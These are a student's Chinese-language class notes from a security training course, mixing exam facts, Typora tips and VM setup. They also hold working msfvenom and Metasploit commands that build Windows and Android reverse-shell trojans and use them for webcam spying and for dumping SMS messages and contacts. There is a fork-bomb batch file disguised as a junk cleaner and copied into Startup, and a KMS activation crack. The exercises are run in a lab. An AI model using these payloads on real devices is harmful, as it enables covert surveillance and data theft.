

# ==错题==

* 护网行动是由**公安部**组织，红蓝双方网络攻防演练
* 在电脑入侵实验中使用软件metasploit，在成功入侵靶机后，获得回连信息，想在靶机内执行dos命令，输入**shell**
* 攻击伊朗浓缩铀设施的病毒名称为**震网**
* 远程桌面端口号**3389**
* **2017年6月1日**《网络安全法》正式实施

* 绑定网关mac `arp -s 网关ip 网关mac`（临时添加，重启失效）

* Windows杀死345进程 `taskkill /pid345`

  #/f是强制 /fi是过滤筛选

* DOS是英文Disk Operating System的缩写,意思是**磁盘操作系统**

* 0day漏洞也不是指某—种特定技术的漏洞，它是指软件或系统中已经被发现，但官方还不知道或还没有发布相应补丁的漏洞。

* 

* 四种爆破模式[burpsuite](#burpsuite的四种爆破模式)

* mysql -uroot P 端口号 -h IP地址 -p密码

* [/passwd和/shadow](#/etc/passwd文件和/etc/shadow文件)

* zc.rar压缩包解密，将压缩包密钥写入到mima.txt中命令zc.rar >rar2john mima.txt

* ==使用ls -l会产生长列表格式输出，包含了目录中每个文件的更多的信息？==
* `ls -a`查看隐藏文件



# ==考试==



* mysql

  登录

  ```
  mysql -uroot -p
  然后输入密码
  ```

  查看数据库

  ```
  show databases;
  ```

* 端口号

  *  rdp 远程桌面                                          3389 端口 

  * http 非加密                                             80 端口
  * https 加密                                               443 端口
  * telnet                                                       23 端口
  * mysql                                                      3306 端口
  * dns 域名解析                                          53 端口
  * ftp 文件传输协议                                    20 21 端口
  * ssh 远程登陆、加密                               22 端口
  
* 国产操作系统

  鸿蒙、欧拉、统信UOS、deepin深度操作系统、麒麟
  
  



# ==***第一天笔记***==

# 下载资料

ftp://10.9.47.36

# 考试

* 2017年6月1日《网络安全法》正式实施

* 蜜罐

  蜜罐是一种主动防御技术，通过主动的暴露一些漏洞、设置一些诱饵来引诱攻击者进行攻击，从而可以对攻击行为进行捕获和分析。
  蜜罐可以故意暴露一些易受攻击的端口，使这些端口保持在开放状态，主动诱使攻击者进入蜜罐环境中，而不是进入真实的系统。一旦攻击者进入蜜罐环境中，就可以连续跟踪攻击者的行为，实现对攻击者的捕获、攻击路径的溯源，并通过评估攻击者的攻击行为，获取有关如何使真实网络更安全的线索，进而通过技术和管理手段来增强实际系统的安全防护能力。

* 护网行动是由**公安部**组织，红蓝双方网络攻防演练

# Typora基本使用

* 快捷键

  ```
  Ctrl+1  一阶标题    		Ctrl+B  字体加粗
  Ctrl+2  二阶标题    		Ctrl+I  字体倾斜
  Ctrl+3  三阶标题   	 		Ctrl+U  下划线
  Ctrl+4  四阶标题    		Ctrl+Home  返回Typora顶部
  Ctrl+5  五阶标题    		Ctrl+End   返回Typora底部
  Ctrl+6  六阶标题    		Ctrl+T  创建表格
  Ctrl+L  选中某句话      	    Ctrl+K  创建超链接
  Ctrl+D  选中某个单词	   	   Ctrl+F  搜索
  Ctrl+E  选中相同格式的文字    Ctrl+H  搜索并替换
  Alt+Shift+5 删除线 		  Ctrl+Shift+I    插入图片
  Ctrl+Shift+M 公式块   		 Ctrl+Shift+Q    引用
  ```

* 标题

  Ctrl+数字

* 字体

  ```
  *斜体*
  **粗体**
  ***斜粗体***
  ```

* 分割线

  连续三个*



* ~~删除线~~

  ```
  ~~删除文字~~
  或alt+shift+5
  ```

  

* 列表

  * 无序列表

    *加空格

  * 有序列表

    1.空格

    1. a
    2. b

  * 嵌套列表

    * 1.1
      * 1.1.2

    tab

* 区块

  ```
  >+空格
  ```

  > 区块
  >
  > 可嵌套
  >
  > > 二级区块
  > >
  > > > 三级区块

* 代码

  ```
  esc下方的`键，一行两侧各一个，多行```+enter
  ```

  

* 链接

  [CSDN](https://www.csdn.net/)

  ```
  [链接文字](链接地址)
  或
  <链接地址>
  ```

  Ctrl+左键访问

  可以打开本地文件地址

  跳转业内标题链接

  [跳转到标题](#标题)

  ```
  [链接文字](#标题文字)
  ```

  

* 插入表格

  | 1    | 2    | 3    |
  | ---- | ---- | ---- |
  |      |      |      |

  ```
  |表头|表头|表头|
  |---|---|----|
  |单元格|单元格|单元格|
  |单元格|单元格|单元格|
  ```

  快捷键Ctrl+T

* 数学公式

  ```
  $$
  a+b=c
  $$
  ```

$$
a+b=c
$$

公式内换行加\\\

* 矩阵表示

  ```
  $$
  \begin{matrix}
  1 & 2 & 3\\
  4 & 5 & 6\\
  \end{matrix}
  $$
  ```

  

$$
\begin{matrix}
1 & 2 & 3\\
4 & 5 & 6\\
\end{matrix}
$$

* HTML字体

  ```
  <font size=13 color="blue">大小，颜色</font>
  <p align="center">居中<\p>
  ```

  <font size=13 color="blue">大小，颜色</font>



<p align="center">居中<\p>



* 插入图像

  ```
  <img src="img/1.jpg" />
  <img src="img/1.jpg" width=100 height=100/>
  <img src="img/1.jpg" width=30 height=30 style="float:left"/>图片在左边
  <img src="img/1.jpg" width=30 height=30 style="float:right"/>图片在右边
  ```

* 生成目录

  ```
   输入@[toc]，即可创建一个“目录”。TOC从文档中提取所有标题，其内容将自动更新。 
  ```

  

* 高亮文本（偏好开启）

  ```
  ==文本==
  ```

  ==文本==

* 上标下标

  ```
  上标^上标^	X^2^
  下标~下标~	H~2~O
  ```

  X^2^

  H~2~O





# 安装虚拟环境

* 安装VMware

<img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731170938530.png" alt="image-20230731170938530" style="zoom: 67%;" />

* 输入密钥

![image-20230731171208749](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731171208749.png)

* 安装完成

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731171232716.png" alt="image-20230731171232716" style="zoom: 67%;" />

<img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731171324168.png" alt="image-20230731171324168" style="zoom: 33%;" />

# 安装Win7虚拟机

* 在VMware中新建虚拟机

* <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731171733589.png" alt="image-20230731171733589" style="zoom: 50%;" />

* 选择稍后安装操作系统

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731171846071.png" alt="image-20230731171846071" style="zoom:50%;" />

* 选择版本

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731171932809.png" alt="image-20230731171932809" style="zoom:67%;" />

* <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731172305522.png" alt="image-20230731172305522" style="zoom:67%;" />

* 虚拟机安装完成

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731172442450.png" alt="image-20230731172442450" style="zoom:67%;" />

* 为虚拟机安装驱动

  选择Win7镜像文件

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731172622191.png" alt="image-20230731172622191" style="zoom: 50%;" />

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731172644449.png" alt="image-20230731172644449" style="zoom:50%;" />

* 点击确定安装

* 开启虚拟机，安装系统

  

 

## Win7虚拟机设置

* 调整分辨率适应窗口大小

* 开始栏输入icom点击显示通用图标

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731190133781.png" alt="image-20230731190133781" style="zoom:50%;" />

  全部勾选

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731190209006.png" alt="image-20230731190209006" style="zoom:50%;" />







# 远程控制

* 虚拟机开启远程控制

  * 右键计算机属性

    ![image-20230731190546849](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731190546849.png)

  * 点击高级系统设置>远程>允许远程链接

  

* 虚拟机打开cmd控制台输入ipconfig查询IP地址

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731174245074.png" alt="image-20230731174245074" style="zoom:67%;" />

* 在物理机上win+R输入mstsc打开控制窗口并输入虚拟机ip，点击连接

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731174339684.png" alt="image-20230731174339684" style="zoom:67%;" />

* 输入账户名和密码远程登录虚拟机

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731174534434.png" alt="image-20230731174534434" style="zoom: 50%;" />

* 将文件直接通过远程桌面复制粘贴到虚拟机







# 激活windows

* 安装运行库

  ![image-20230731175030073](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731175030073.png)

* 重启虚拟机，断网打开MicroKMS

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731175457633.png" alt="image-20230731175457633" style="zoom:67%;" />

* 恢复网络，点击激活

  ![image-20230731192604148](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731192604148.png)

* 激活成功

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731192807976.png" alt="image-20230731192807976" style="zoom:50%;" />

* 关机，拍摄快照

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230731193025554.png" alt="image-20230731193025554" style="zoom:50%;" />













***

# ==***第二天笔记***==





# kali安装

* 点击kali安装包

  ![image-20230801093603539](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801093603539.png)

* 选择安装路径

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801093628466.png" alt="image-20230801093628466" style="zoom: 67%;" />

## 设置kali密码

* 在此界面按E键

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801093928706.png" alt="image-20230801093928706" style="zoom: 50%;" />

* 进入该界面,将ro改为rw

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801094024515.png" alt="image-20230801094024515" style="zoom:67%;" />

* 在quiet后面输入空格后输入以下字符，Ctrl+x确认

![image-20230801094156743](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801094156743.png)

* 进入终端界面输入更改root密码指令

<img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801094444808.png" alt="image-20230801094444808" style="zoom:67%;" />

* 输入两遍密码123456



# 单位转换

```
1Byte(字节) = 8bit（位）
1KB = 1024B
1MB = 1024KB
1GB = 1024MB
1TB = 1024GB
0或1占一位（1bit）
```





# 电脑木马

* 环境：Kali、Win7

* 测试是否连通：ping

  Kali ping停止：Ctrl+Z

  

## 生成木马app

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=4444 -f exe > muma.exe
LHOST 设置远控回联的客户端IP,也就是Kali主机的IP地址
LPORT 设置回联的客户端端口号,也就是kali主机监听的端口号
```

<img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801104043034.png" alt="image-20230801104043034" style="zoom:67%;" />

* 被入侵的电脑下载木马

## 木马启动

* msfconsole启动

  ```
  msfconsole
  ```

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801104159747.png" alt="image-20230801104159747" style="zoom:67%;" />

* 使用后门模块

  ```
  use exploit/multi/handler
  ```

* 攻击载荷

  ```
  set payload windows/meterpreter/reverse_tcp
  ```

* 设置客户端IP（Kali）

  ```
  set LHOST 192.168.3.27
  ```

* 设置客户端监听端口

  ```
  set LPORT 4444
  ```

* 启动客户端服务

  ```
  run
  ```

  ![image-20230801104435812](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801104435812.png)

* 被入侵主机运行木马文件

  成功建立连接，此时可控制被入侵电脑

  ![image-20230801104526752](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801104526752.png)

## 木马使用

==help命令可查看具体的攻击命令和描述==

* Kali使用shell命令进入被入侵主机系统

  ```
  shell
  ```

  ![image-20230801104609451](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801104609451.png)

  ```
  如使用命令
  mkdir 2304
  则会生成一个名为2304的文件夹
  ```

![image-20230801104657567](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801104657567.png)

* 被入侵主机界面

  ![image-20230801104804793](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801104804793.png)

* 监控电脑屏幕

  ```
  run vnc
  ```

* 退出

  ```
  exit
  ```


* download命令可以下载远程主机上的文件

  > 命令：download文件名 文件路径to保存的位置
  >
  > 注意：windows路径要使用双斜线【[linux](https://so.csdn.net/so/search?q=linux&spm=1001.2101.3001.7020)向左边，windows向右边】
  >
  > 如果我们需要递归下载整个目录包括子目录和文件，我们可以使用download -r命令

* 检查摄像头

  ```
  webcam_list
  ```

* 开启摄像头

  ```
  webcam_stream
  ```

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801145309652.png" alt="image-20230801145309652" style="zoom: 67%;" />

* 截图

  ```
  webcam_snap
  ```
  
* 从Windows上下载文件

  ```
  命令：download文件名 文件路径to保存的位置
  或 download 文件路径
  
  注意：windows路径要使用双斜线【linux向左边，windows向右边】
  
  如果我们需要递归下载整个目录包括子目录和文件，我们可以使用download -r命令
  ```

  ![image-20230804144036469](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230804144036469.png)


* ***Win10效果***

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801110910174.png" alt="image-20230801110910174" style="zoom: 33%;" />

  ***关闭杀毒依旧连接失败***

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801111518183.png" alt="image-20230801111518183" style="zoom: 67%;" />

  ==原因==

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801144851146.png" alt="image-20230801144851146" style="zoom:67%;" />

  ==检查配置，攻击载荷未设置Windows默认为generic==

  ```
  show options
  ```

  

# 开启http服务提供文件下载

* ```
  python3 -m http.server 80
  ```

![image-20230801103428890](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801103428890.png)

* 同一局域网下输入kali的IP即可访问kali中的文件

  * ***默认访问百度***

    解决：删除home文件下的index.html

    ![image-20230801103714802](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801103714802.png)




# 关闭占用的端口

* 查询占用端口的PID

  ```
  netstat -lnp|grep 端口号
  ```

* 关闭端口

  ```
  kill -9 PID
  ```

![image-20230801102517912](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801102517912.png)





# 查网卡

```
ipconfig /all
```

网卡名称

![image-20230801154529449](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801154529449.png)



# day2作业

***通过手机开热点，模拟家里wifi，使两台电脑同时连接到同一个wifi下面，然后对对方彼此的电脑。植入木马***

* 连接热点或者WiFi需要使用电脑的无线网卡，在选择桥接模式的时候需要选择桥接无线网卡

  * 首先打开虚拟网络编辑器

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801155104819.png" alt="image-20230801155104819" style="zoom: 50%;" />

  * 选择无线网卡

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801155313785.png" alt="image-20230801155313785" style="zoom: 50%;" />

  * 将VMnet0设置为无线网卡桥接

    ![image-20230801155612503](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801155612503.png)

  * 选择网络连接为VMnet0

    ![image-20230801155725248](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801155725248.png)

  * 两电脑设置完连接同一WiFi或热点，则此时可以ping通

  * 主机ip为

    ![image-20230801184729840](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801184729840.png)

  * kali的ip为

    ![image-20230801184827465](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801184827465.png)

  * 生成木马

    ![image-20230801191349556](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801191349556.png)

  * 被攻击的主机下载木马程序

    ![image-20230801192949379](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801192949379.png)

    ![image-20230801193048963](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801193048963.png)

  * 连接成功









# ==***第三天笔记***==





# 安卓虚拟机的安装

## 安装系统

1. 在VMware中创建新的虚拟机，选择典型

   选择Linux 5.x内核64位版本（安卓基于Linux）

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802094251419.png" alt="image-20230802094251419" style="zoom: 50%;" />

2. 分配20G内存

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802094459861.png" alt="image-20230802094459861" style="zoom: 50%;" />

3. 完成创建，配置安卓虚拟机

   内存分配2G

   ![image-20230802094633155](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802094633155.png)

4. 选择安卓ISO镜像文件

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802094808556.png" alt="image-20230802094808556" style="zoom:50%;" />

5. 开启虚拟机，选择第三个安装

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802094906610-1690940948256-1.png" alt="image-20230802094906610" style="zoom:50%;" />

6. 选择第一个创建分区

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802095043051.png" alt="image-20230802095043051" style="zoom:50%;" />

7. 选择NO

   ![image-20230802095123500](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802095123500.png)

8. 选择New创建新的分区

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802095230119.png" alt="image-20230802095230119" style="zoom:50%;" />

9. 创建主分区，选择Primary

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802095317105.png" alt="image-20230802095317105" style="zoom:50%;" />

10. enter

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802095519585.png" alt="image-20230802095519585" style="zoom:50%;" />

11. 选择write写入

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802095651586.png" alt="image-20230802095651586" style="zoom:50%;" />

12. 输入yes在磁盘写入分区表

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802095738697.png" alt="image-20230802095738697" style="zoom:50%;" />

13. 退出

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802095846712.png" alt="image-20230802095846712" style="zoom:50%;" />

14. 选择OK

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802095957363.png" alt="image-20230802095957363" style="zoom:50%;" />

15. 格式化，Linux一般用ext4格式

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802100121435.png" alt="image-20230802100121435" style="zoom:50%;" />

16. yes

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802100206860.png" alt="image-20230802100206860" style="zoom: 67%;" />

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802100247282.png" alt="image-20230802100247282" style="zoom: 80%;" />

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802100305339.png" alt="image-20230802100305339" style="zoom:67%;" />

17. 运行安卓系统

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802100502999.png" alt="image-20230802100502999" style="zoom: 80%;" />

## 设置图形化界面

1. 该界面重启虚拟机

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802100724372.png" alt="image-20230802100724372" style="zoom:50%;" />

2. 选择第二个选项调试

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802100809041.png" alt="image-20230802100809041" style="zoom: 50%;" />

3. 停留在此界面按两下回车

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802100853498.png" alt="  " style="zoom:50%;" />

4. 输入此代码修改启动项

   ![image-20230802101213747](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802101213747.png)

   ```
   vi /mnt/grub/menu.lst
   ```

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802101443947.png" alt="image-20230802101443947" style="zoom:67%;" />

5. 回车后将光标移动到quiet后按下i键进入编辑模式

   此时下方会变成I

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802101540069.png" alt="image-20230802101540069" style="zoom:67%;" />

6. 在quiet后输入nomodeset

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802101736960.png" alt="image-20230802101736960" style="zoom: 50%;" />

7. 按esc键退出编辑模式

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802101831107-1690942713640-3.png" alt="image-20230802101831107" style="zoom:50%;" />

8. 退出写入（保存）

   输入：wq

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802101935701.png" alt="image-20230802101935701" style="zoom:50%;" />

   重启虚拟机

9. 自动进入图形化操作界面

   此界面选择第二个选项

   <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802103154636.png" alt="image-20230802103154636" style="zoom:80%;" />

10. 成功创建安卓虚拟机

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802103215895.png" alt="image-20230802103215895" style="zoom:50%;" />





# 安卓木马入侵

## 生成安卓木马

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.191.131 LPORT=4444 R>zc.apk
```

## 安卓虚拟机下载木马

* 由于虚拟机无法使用浏览器下载，可以通过终端命令进行下载

  ![image-20230802114352939](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802114352939.png)

  在home目录下kali已经生成了zc.apk木马程序

* 在文件中点击显示内部存储可以看到还有19G的内存可供使用

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802134812791.png" alt="image-20230802134812791" style="zoom: 50%;" />

* 打开Android的终端模拟器

  ping下kali看是否可以通信

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802135217656.png" alt="image-20230802135217656"  />

  无法连接网络

  ***安卓虚拟机存在bug，需重新配置一个新的网络适配器***

  ![image-20230802135436134](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802135436134.png)

* 此时可以与kali ping通

  ![image-20230802135552560](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802135552560.png)

* 使用ls命令查看当前盘符下的文件

  ```
  ls
  ```

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802135704959.png" alt="image-20230802135704959" style="zoom:80%;" />

* 进入sdcard，只有在sdcard中才有存储权限

  ```
  cd sdcard
  ```

* 下载kali中的zc.akp文件

  ```
  wget IP/文件
  ```

  ![image-20230802140100753](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802140100753.png)

  (第一次失败是因为kali未开启80服务)

* 进入文件系统，发现其中已经有了zc.apk文件

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802140418794.png" alt="image-20230802140418794" style="zoom: 50%;" />

## 木马启动

* msfconsole启动

  ```
  msfconsole
  ```

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801104159747.png" alt="image-20230801104159747" style="zoom:67%;" />

* 使用后门模块

  ```
  use exploit/multi/handler
  ```

* 攻击载荷

  ```
  set payload android/meterpreter/reverse_tcp
  ```

* 设置客户端IP（Kali）

  ```
  set LHOST 192.168.3.27
  ```

* 设置客户端监听端口

  ```
  set LPORT 4444
  ```

* 启动客户端服务

  ```
  run
  ```

  ![image-20230801104435812](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230801104435812.png)

* 安卓虚拟机打开木马文件

  连接成功

  ![image-20230802142114036](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802142114036.png)

* 检查摄像头

  ```
  webcam_list
  ```

* 开启摄像头

  ```
  webcam_stream
  ```

* 获取手机短信记录

  ```
  dump_sms
  ```

* 获取通讯录

  ```
  dump_contacts
  ```

  ![image-20230802142344010](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802142344010.png)

  保存成功

* 回到home文件夹查看文件

  通讯录保存到此文件中

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802142516318.png" alt="image-20230802142516318"  />

* 查看文件

  ![image-20230802142608343](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802142608343.png)

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802142856663.png" alt="image-20230802142856663" style="zoom:67%;" />





# 练习

## 克隆虚拟机

* 右键虚拟机>管理>克隆

  创建完整克隆（不依托原虚拟机）

  ![image-20230802161719779](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802161719779.png)

* ![image-20230802161855285](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802161855285.png)





## win7-1远程到win7-2

* win7-2开启远程功能

  ![image-20230802162315017](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802162315017.png)

* 设置win7-1和win7-2使用同一网络（如设置成NAT模式）

* win7-2的IP地址为192.168.191.136

  ![image-20230802162549512](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802162549512.png)

* 在win7-1中Win+R，输入mstsc

  ![image-20230802162715847](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802162715847.png)

* 输入Win7-2的IP地址

  ![image-20230802163144588](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802163144588.png)

* 输入账户密码

  ![image-20230802163042170](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802163042170.png)

* 登陆成功

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802163118007.png" alt="image-20230802163118007" style="zoom:50%;" />

## win7-1远程到同桌的的win7-1

* 将虚拟机设置成桥接模式

  双方连接的网线，桥接至有线网卡

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802163953820.png" alt="image-20230802163953820" style="zoom:50%;" />

* Win+R输入mstsc，输入同桌Win7-1的IP

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802164646517.png" alt="image-20230802164646517" style="zoom:50%;" />

* 输入密码

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802164712045.png" alt="image-20230802164712045" style="zoom: 67%;" />

* 登陆成功

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230802164753922.png" alt="image-20230802164753922" style="zoom: 50%;" />










# ***==第四天笔记==***

# 小病毒



## 无限弹出框

* bat批处理文件运行

  ```
  start cmd
  %0               ::无限循环
  ```

  ```
  :1
  start
  goto 1
  ```

  ```
  @echo off             ::关闭命令回显
  ```

  ```
  color  0a         ：：更改颜色-数字/字母
  ```

  ```
  echo.             ::换行
  ```

  ```
  echo 文字          ::print
  ```

  ```
  echo 123 > a.txt   ::创建a.txt写入123
  ```

  ```
  echo 123 >> a.txt   ::向a.txt追加123
  ```

  ```
  pause             ::暂停并显示
  ```

  ```
  md 文件夹名        ::创建文件夹
  ```

  ```
  copy 位置\文件名.后缀或文件夹 位置   ::复制文件（如果有空可则用双引号）
  copy C:\Users\zc\Desktop\91TV.bat "C:\Users\zc\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  ```

  

* ping两次

  ```
  ping -n 2 IP
  ```

* 取消ping回显

  ```
  ping -n 2 127.0.0.1 > null
  ```

* "垃圾清理小程序"

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803094226718.png" alt="image-20230803094226718" style="zoom:67%;" />

  运行效果

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803094313402.png" alt="image-20230803094313402" style="zoom: 67%;" />

* 无限弹出框小病毒

